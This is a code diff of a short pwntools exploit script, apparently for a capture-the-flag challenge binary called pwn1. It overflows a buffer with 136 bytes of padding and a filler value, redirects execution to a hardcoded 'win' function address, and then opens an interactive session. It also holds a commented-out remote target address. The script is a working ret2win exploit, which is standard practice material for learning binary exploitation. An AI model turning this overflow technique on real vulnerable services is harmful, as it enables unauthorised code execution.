@@ -1,14 +1,15 @@
-#ret2win
+#!/usr/bin/python3
+
 from pwn import *
 
-p = process("./pwn1")   
+exe = ELF('./pwn1', checksec=False)
 # p = remote("14.225.255.41", 13331)
+p = process(exe.path)
 
-payload = b"a"*136
-payload += p64(0xDEADBEEF) #chuyen chuoi hex sang 8 bytes
-
-win = 0x000000000040130c #dia chi ham win
+# input()
+payload = b'a'*136 + p64(0xdeadbeef)
+win = 0x000000000040130c
 payload += p64(win)
+p.sendafter(b'name: ', payload)
 
-p.sendlineafter(b"Enter your name: ", payload)
 p.interactive()
